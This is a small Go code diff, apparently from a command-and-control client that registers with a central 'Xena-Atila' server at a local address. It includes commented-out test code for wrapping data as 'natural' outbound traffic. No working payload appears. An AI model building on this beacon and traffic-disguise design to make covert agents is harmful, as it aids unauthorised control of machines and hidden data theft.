@@ -10,7 +10,7 @@ import (
 )
 
 // Xena-Atila.
-var centralizedHost string = os.Args[1]
+var centralizedHost string = os.Args[1] // "http://127.0.0.1:60666"
 
 // Used for authentication.
 // var privateKey = generatePrivateKey()
@@ -19,7 +19,13 @@ var centralizedHost string = os.Args[1]
 var id uuid.UUID = uuid.New()
 
 func main() {
-	fmt.Println(id)
+	// test := NaturalTrafficOut(time.Now().UnixNano(), `SomeTextVeryImportantData,UseBASE64Here!`)
+	// insertionPayload, marshalErr := json.Marshal(test)
+	// if marshalErr != nil {
+	// 	fmt.Println(marshalErr.Error())
+	// }
+	// fmt.Println(string(insertionPayload))
+	// fmt.Println("\n\n\n\n")
 
 	// Identifies itself to the Xena-Atila.
 	identify(id.String())
